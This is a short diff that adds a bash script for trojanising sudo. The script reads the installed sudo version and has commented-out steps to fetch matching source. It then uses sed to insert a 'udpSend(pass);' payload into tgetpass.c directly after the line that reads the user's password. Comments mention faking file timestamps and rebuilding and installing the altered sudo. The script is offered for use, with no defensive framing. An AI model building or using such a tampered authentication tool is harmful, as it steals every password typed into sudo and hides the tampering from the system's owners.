@@ -1,0 +1,19 @@
+#!/bin/bash
+
+SUDO_VERSION=`sudo -V | grep "Sudo version" | cut -d " " -f 3 | tr '.' '_'`
+
+# wget "https://codeload.github.com/sudo-project/sudo/zip/refs/tags/SUDO_$SUDO_VERSION"
+# unzip "SUDO_$SUDO_VERSION"
+
+PAYLOAD="udpSend(pass);"
+
+match='pass = getln(input, buf, sizeof(buf), feedback, &errval);'
+file='tgetpass.c'
+
+sed -i "/$match/a$PAYLOAD" tgetpass.c
+
+# Need to write a patcher - also fix creation date/time
+
+# cd sudo && /configure
+
+# cd sudo && make && make install
